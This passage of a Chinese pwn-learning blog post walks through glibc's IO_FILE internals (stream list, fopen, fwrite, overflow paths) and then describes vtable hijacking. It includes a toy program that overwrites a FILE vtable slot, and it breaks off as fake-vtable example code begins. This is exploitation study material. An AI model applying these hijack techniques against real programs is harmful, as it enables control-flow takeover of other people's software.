class=\"line\"><span class=\"meta\">    = &#123;FILEBUF_LITERAL(CHAIN, FLAGS, FD, &amp;_IO_wide_data_##FD), \\</span></span><br><span class=\"line\"><span class=\"meta\">       &amp;_IO_file_jumps&#125;;</span></span><br><span class=\"line\"><span class=\"meta\"># <span class=\"keyword\">else</span></span></span><br><span class=\"line\"><span class=\"meta\">#  <span class=\"keyword\">define</span> DEF_STDFILE(NAME, FD, CHAIN, FLAGS) \\</span></span><br><span class=\"line\"><span class=\"meta\">  struct _IO_FILE_plus NAME \\</span></span><br><span class=\"line\"><span class=\"meta\">    = &#123;FILEBUF_LITERAL(CHAIN, FLAGS, FD, NULL), \\</span></span><br><span class=\"line\"><span class=\"meta\">       &amp;_IO_file_jumps&#125;;</span></span><br><span class=\"line\"><span class=\"meta\"># <span class=\"keyword\">endif</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">DEF_STDFILE(_IO_2_1_stdin_, <span class=\"number\">0</span>, <span class=\"number\">0</span>, _IO_NO_WRITES);</span><br><span class=\"line\">DEF_STDFILE(_IO_2_1_stdout_, <span class=\"number\">1</span>, &amp;_IO_2_1_stdin_, _IO_NO_READS);</span><br><span class=\"line\">DEF_STDFILE(_IO_2_1_stderr_, <span class=\"number\">2</span>, &amp;_IO_2_1_stdout_, _IO_NO_READS+_IO_UNBUFFERED);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_FILE_plus</span> *_<span class=\"title\">IO_list_all</span> =</span> &amp;_IO_2_1_stderr_;</span><br><span class=\"line\">libc_hidden_data_def (_IO_list_all)</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t并且存在 3 个全局指针 <code>stdin</code>，<code>stdout</code>，<code>stderr</code> 分别指向 <code>_IO_2_1_stdin_</code>，<code>_IO_2_1_stdout_</code>，<code>_IO_2_1_stderr_</code> 三个结构体。</p>\n<p>stdio.c</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> stdin</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> stdout</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> stderr</span></span><br><span class=\"line\">_IO_FILE *<span class=\"built_in\">stdin</span> = (FILE *) &amp;_IO_2_1_stdin_;</span><br><span class=\"line\">_IO_FILE *<span class=\"built_in\">stdout</span> = (FILE *) &amp;_IO_2_1_stdout_;</span><br><span class=\"line\">_IO_FILE *<span class=\"built_in\">stderr</span> = (FILE *) &amp;_IO_2_1_stderr_;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> _IO_stdin</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> _IO_stdout</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> _IO_stderr</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t于是初始化后的结构如下,可以看到是头插法插入新来的iofile</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-37-IOFILE%E5%88%9D%E6%8E%A2/b71716ff58f043fbec0605f33b934102.png\" alt=\"b71716ff58f043fbec0605f33b934102\"></p>\n<h2 id=\"fopen\"><a href=\"#fopen\" class=\"headerlink\" title=\"fopen\"></a>fopen</h2><p>​\t\tfopen在标准IO库中用于打开文件,函数原型如下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">FILE *<span class=\"title function_\">fopen</span><span class=\"params\">(<span class=\"type\">char</span> *filename, *type)</span>;</span><br></pre></td></tr></table></figure>\n\n<p>源码分析如下</p>\n<p>include&#x2F;stdio.h</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#  <span class=\"keyword\">if</span> IS_IN (libc)</span></span><br><span class=\"line\"><span class=\"keyword\">extern</span> _IO_FILE *_IO_new_fopen (<span class=\"type\">const</span> <span class=\"type\">char</span>*, <span class=\"type\">const</span> <span class=\"type\">char</span>*);</span><br><span class=\"line\"><span class=\"meta\">#   <span class=\"keyword\">define</span> fopen(fname, mode) _IO_new_fopen (fname, mode)</span></span><br></pre></td></tr></table></figure>\n\n<p>libio&#x2F;iofopen.c</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_IO_FILE *</span><br><span class=\"line\">_IO_new_fopen (<span class=\"type\">const</span> <span class=\"type\">char</span> *filename, <span class=\"type\">const</span> <span class=\"type\">char</span> *mode)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __fopen_internal (filename, mode, <span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t具体代码分析</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_IO_FILE *</span><br><span class=\"line\">__fopen_internal (<span class=\"type\">const</span> <span class=\"type\">char</span> *filename, <span class=\"type\">const</span> <span class=\"type\">char</span> *mode, <span class=\"type\">int</span> is32)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">locked_FILE</span></span></span><br><span class=\"line\"><span class=\"class\">  &#123;</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_FILE_plus</span> <span class=\"title\">fp</span>;</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class=\"line\">    _IO_lock_t lock;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_wide_data</span> <span class=\"title\">wd</span>;</span></span><br><span class=\"line\">  &#125; *new_f = (<span class=\"keyword\">struct</span> locked_FILE *) <span class=\"built_in\">malloc</span> (<span class=\"keyword\">sizeof</span> (<span class=\"keyword\">struct</span> locked_FILE)); <span class=\"comment\">//调用malloc分配FILE结构的空间,从这里也可以知道FILE结构存储在堆中</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (new_f == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">....</span><br><span class=\"line\">  _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;<span class=\"comment\">//初始化vtable</span></span><br><span class=\"line\">  _IO_file_init (&amp;new_f-&gt;fp);<span class=\"comment\">//调用函数进行进一步初始化操作</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != <span class=\"literal\">NULL</span>)<span class=\"comment\">//打开目标文件,最后会调用到系统调用open</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);</span><br><span class=\"line\"></span><br><span class=\"line\">  _IO_un_link (&amp;new_f-&gt;fp);</span><br><span class=\"line\">  <span class=\"built_in\">free</span> (new_f);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>fileops.c: _IO_file_init</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span></span><br><span class=\"line\">_IO_new_file_init (<span class=\"keyword\">struct</span> _IO_FILE_plus *fp)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"comment\">/* POSIX.1 allows another file handle to be used to change the position</span></span><br><span class=\"line\"><span class=\"comment\">     of our file descriptor.  Hence we actually don&#x27;t know the actual</span></span><br><span class=\"line\"><span class=\"comment\">     position before we do the first fseek (and until a following fflush). */</span></span><br><span class=\"line\">  fp-&gt;file._offset = _IO_pos_BAD;</span><br><span class=\"line\">  fp-&gt;file._IO_file_flags |= CLOSED_FILEBUF_FLAGS;</span><br><span class=\"line\"></span><br><span class=\"line\">  _IO_link_in (fp);<span class=\"comment\">//把新分配的FILE链入_IO_list_all为起始的FILE链表中</span></span><br><span class=\"line\">  fp-&gt;file._fileno = <span class=\"number\">-1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>genops.c  但是这个操作不是会让fp成为头部嘛????????</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span></span><br><span class=\"line\">_IO_link_in (<span class=\"keyword\">struct</span> _IO_FILE_plus *fp)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ((fp-&gt;file._flags &amp; _IO_LINKED) == <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      fp-&gt;file._flags |= _IO_LINKED;</span><br><span class=\"line\"></span><br><span class=\"line\">      fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;</span><br><span class=\"line\">      _IO_list_all = fp;</span><br><span class=\"line\">      ++_IO_list_all_stamp;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"fread\"><a href=\"#fread\" class=\"headerlink\" title=\"fread\"></a>fread</h2><p>​\t\t可以看下参考链接1给的流程图,结合代码来看</p>\n<p>libio&#x2F;iofread.c</p>\n<h2 id=\"fwrite\"><a href=\"#fwrite\" class=\"headerlink\" title=\"fwrite\"></a>fwrite</h2><p>​\t\t标准IO库函数,用于向文件流中写入数据, 函数原型如下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">size_t</span> <span class=\"title function_\">fwrite</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">void</span>* buffer, <span class=\"type\">size_t</span> size, <span class=\"type\">size_t</span> count, FILE* stream)</span>;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>buffer: 是一个指针，对 fwrite 来说，是<strong>需要写入文件的数据的地址</strong>;</li>\n<li>size: 要写入内容的单字节数;</li>\n<li>count: 要进行写入 size 字节的数据项的个数;</li>\n<li>stream: 目标文件指针;<strong>(要写入的文件)</strong></li>\n<li>返回值：实际写入的数据项个数 count。</li>\n</ul>\n<p>libio&#x2F;iofwrite.c</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_IO_size_t</span><br><span class=\"line\">_IO_fwrite (<span class=\"type\">const</span> <span class=\"type\">void</span> *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  _IO_size_t request = size * count;</span><br><span class=\"line\">  _IO_size_t written = <span class=\"number\">0</span>;</span><br><span class=\"line\">  CHECK_FILE (fp, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (request == <span class=\"number\">0</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">  _IO_acquire_lock (fp);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (_IO_vtable_offset (fp) != <span class=\"number\">0</span> || _IO_fwide (fp, <span class=\"number\">-1</span>) == <span class=\"number\">-1</span>)</span><br><span class=\"line\">    written = _IO_sputn (fp, (<span class=\"type\">const</span> <span class=\"type\">char</span> *) buf, request);</span><br><span class=\"line\">  _IO_release_lock (fp);</span><br><span class=\"line\">  <span class=\"comment\">/* We have written all of the input in case the return value indicates</span></span><br><span class=\"line\"><span class=\"comment\">     this or EOF is returned.  The latter is a special case where we</span></span><br><span class=\"line\"><span class=\"comment\">     simply did not manage to flush the buffer.  But the data is in the</span></span><br><span class=\"line\"><span class=\"comment\">     buffer and therefore written as far as fwrite is concerned.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (written == request || written == EOF)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> count;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> written / size;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">libc_hidden_def (_IO_fwrite)</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t主要调用了  _IO_sputn 来实现写入的功能,  _IO_sputn 位于  _IO_FILE_plus 的 vtable 中，调用这个函数需要首先取出 vtable 中的指针，再跳过去进行调用。 <font color=\"red\">它对应了函数 _IO_new_file_xsputn,咋对应的…</font></p>\n<p>fileops.c</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_IO_size_t</span><br><span class=\"line\">_IO_new_file_xsputn (_IO_FILE *f, <span class=\"type\">const</span> <span class=\"type\">void</span> *data, _IO_size_t n)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">const</span> <span class=\"type\">char</span> *s = (<span class=\"type\">const</span> <span class=\"type\">char</span> *) data;</span><br><span class=\"line\">  _IO_size_t to_do = n;</span><br><span class=\"line\">  <span class=\"type\">int</span> must_flush = <span class=\"number\">0</span>;</span><br><span class=\"line\">  _IO_size_t count = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (n &lt;= <span class=\"number\">0</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"comment\">/* This is an optimized implementation.</span></span><br><span class=\"line\"><span class=\"comment\">     If the amount to be written straddles a block boundary</span></span><br><span class=\"line\"><span class=\"comment\">     (or the filebuf is unbuffered), use sys_write directly. */</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* First figure out how much space is available in the buffer. */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (count &gt;= n)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t  <span class=\"type\">const</span> <span class=\"type\">char</span> *p;</span><br><span class=\"line\">\t  <span class=\"keyword\">for</span> (p = s + n; p &gt; s; )</span><br><span class=\"line\">\t    &#123;</span><br><span class=\"line\">\t      <span class=\"keyword\">if</span> (*--p == <span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t  count = p - s + <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t  must_flush = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t  <span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t    &#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class=\"line\">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class=\"comment\">/* Space available. */</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Then fill the buffer. */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (count &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (count &gt; to_do)</span><br><span class=\"line\">\tcount = to_do;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> _LIBC</span></span><br><span class=\"line\">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">else</span></span></span><br><span class=\"line\">      <span class=\"built_in\">memcpy</span> (f-&gt;_IO_write_ptr, s, count);</span><br><span class=\"line\">      f-&gt;_IO_write_ptr += count;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">      s += count;</span><br><span class=\"line\">      to_do -= count;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (to_do + must_flush &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      _IO_size_t block_size, do_write;</span><br><span class=\"line\">      <span class=\"comment\">/* Next flush the (full) buffer. */</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class=\"line\">\t<span class=\"comment\">/* If nothing else has to be written we must not signal the</span></span><br><span class=\"line\"><span class=\"comment\">\t   caller that everything has been written.  */</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> to_do == <span class=\"number\">0</span> ? EOF : n - to_do;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* Try to maintain alignment: write a whole number of blocks.  */</span></span><br><span class=\"line\">      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;</span><br><span class=\"line\">      do_write = to_do - (block_size &gt;= <span class=\"number\">128</span> ? to_do % block_size : <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (do_write)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t  count = new_do_write (f, s, do_write);</span><br><span class=\"line\">\t  to_do -= count;</span><br><span class=\"line\">\t  <span class=\"keyword\">if</span> (count &lt; do_write)</span><br><span class=\"line\">\t    <span class=\"keyword\">return</span> n - to_do;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* Now write out the remainder.  Normally, this will fit in the</span></span><br><span class=\"line\"><span class=\"comment\">\t buffer, but it&#x27;s somewhat messier for line-buffered files,</span></span><br><span class=\"line\"><span class=\"comment\">\t so we let _IO_default_xsputn handle the general case. */</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (to_do)</span><br><span class=\"line\">\tto_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> n - to_do;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">libc_hidden_ver (_IO_new_file_xsputn, _IO_file_xsputn)</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t这里主要会调用同样位于vtable中的_IO_OVERFLOW,对应函数是 _IO_new_file_overflow</p>\n<p>fileops.c</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span></span><br><span class=\"line\">_IO_new_file_overflow (_IO_FILE *f, <span class=\"type\">int</span> ch)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">...........</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (ch == EOF)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class=\"line\">\t\t\t f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class=\"comment\">/* Buffer is really full */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (_IO_do_flush (f) == EOF)</span><br><span class=\"line\">      <span class=\"keyword\">return</span> EOF;</span><br><span class=\"line\">..........</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t在这里会最终调用write系统调用</p>\n<h2 id=\"fclose\"><a href=\"#fclose\" class=\"headerlink\" title=\"fclose\"></a>fclose</h2><h2 id=\"伪造-劫持\"><a href=\"#伪造-劫持\" class=\"headerlink\" title=\"伪造 劫持\"></a>伪造 劫持</h2><p>​\t\tvtable 劫持分为两种，一种是直接改写 vtable 中的函数指针，<strong>通过任意地址写就可以实现</strong>。另一种是覆盖 vtable 的指针指向我们控制的内存，然后在其中布置函数指针。</p>\n<p>​\t\t伪造 vtable 劫持程序流程的中心思想就是针对_IO_FILE_plus 的 vtable 动手脚，通过把 vtable 指向我们控制的内存，并在其中布置函数指针来实现。\t</p>\n<p>奇怪,必须要加\\n , 和缓冲区刷新有关</p>\n<p>gcc -g 可以在调试的时候….</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    FILE *fp;</span><br><span class=\"line\">    <span class=\"type\">long</span> <span class=\"type\">long</span> *vtable_ptr;</span><br><span class=\"line\">    fp=fopen(<span class=\"string\">&quot;123.txt&quot;</span>,<span class=\"string\">&quot;rw&quot;</span>);</span><br><span class=\"line\">    vtable_ptr=*(<span class=\"type\">long</span> <span class=\"type\">long</span>*)((<span class=\"type\">long</span> <span class=\"type\">long</span>)fp+<span class=\"number\">0xd8</span>);     <span class=\"comment\">//get vtable</span></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;vtable_ptr: %p\\n&quot;</span>, (<span class=\"type\">void</span>*)vtable_ptr);  <span class=\"comment\">// 打印vtable_ptr的值</span></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;addr1:%p\\n&quot;</span>, (<span class=\"type\">void</span>*)vtable_ptr);  <span class=\"comment\">// 打印vtable_ptr的值</span></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;addr2:%p\\n &quot;</span>,(<span class=\"type\">void</span>*)vtable_ptr);</span><br><span class=\"line\">    vtable_ptr[<span class=\"number\">7</span>]=<span class=\"number\">0x41414141</span>; <span class=\"comment\">//xsputn</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;call 0x41414141&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<img src=\"/pwn%E5%85%A5%E9%97%A8-37-IOFILE%E5%88%9D%E6%8E%A2/image-20230805203530314.png\" alt=\"image-20230805203530314\" style=\"zoom:50%;\">\n\n\n\n<img src=\"/pwn%E5%85%A5%E9%97%A8-37-IOFILE%E5%88%9D%E6%8E%A2/image-20230805203540676.png\" alt=\"image-20230805203540676\" style=\"zoom: 50%;\">\n\n\n\n<p>​\t\t但是在目前 libc2.23 版本下，位于 libc 数据段的 vtable 是不可以进行写入的。不过，通过在可控的内存中伪造 vtable 的方法依然可以实现利用。</p>\n<p>​\t\tvtable_addr[0]位于堆中,可以写,这样就相当于要伪造整个vtable表</p>\n<h3 id=\"示例代码\"><a href=\"#示例代码\" class=\"headerlink\" title=\"示例代码\"></a>示例代码</h3><p>​\t\tsystem_ptr根据实际情况修改</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span 